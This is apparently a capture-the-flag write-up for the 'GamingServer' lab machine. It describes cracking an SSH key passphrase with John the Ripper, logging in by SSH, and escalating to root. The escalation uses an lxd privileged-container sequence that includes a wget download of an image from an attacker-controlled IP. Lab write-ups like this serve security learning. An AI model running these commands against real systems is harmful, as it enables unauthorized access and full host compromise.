# GamingServer

### Task 1

*What is the user flag?*

After running GoBuster we get a /secret path on the web server. This contains a private RSA key. We need to find the passphrase for the key, this willbe done using John The Ripper. First convert the key to something John can understand:

ssh2john secretKey > hash.txt

john hash.txt

This get us the passphrase "letmein”. Next we need to decrypt the private key in order to gain access to the target system via SSH. 

openssl rsa -in secretKey -out decrypted_key -passin pass:letmein

Next, we try to connect to the target system, using the user John that was found in the page source of the web server.

ssh -i decrypted_key john@10.10.199.36

Lastly, cat the user.txt file to get the flag. 

Ans: Flag found in user.txt

*What is the root flag?*

In order to look for exploits we will put [linpeas.sh](http://linpeas.sh) on the target machine. Run the analysis and llok for exploit. We see in teh analysis something called lxd, searching for exploits, we get a privilege escalation for this. We follow the instructions in the exploit to build alpine. Next we get alpine on the target machine.

wget 10.23.194.194:1337/alpine-v3.13-x86_64-202051117_1759.tar.gz

lxc image import ./alpine-v3.13-x86_64-202051117_1759.tar.gz —alias any_alias

lxc image list 

lxc init any_alias cont -c security.privileged=true

lxc config device add cont mydevice disk source=/ path=/mnt/root recursive=true

lxc start cont

lxc exec cont /bin/sh

cat /root/root.txt

Ans: Flag in root.txt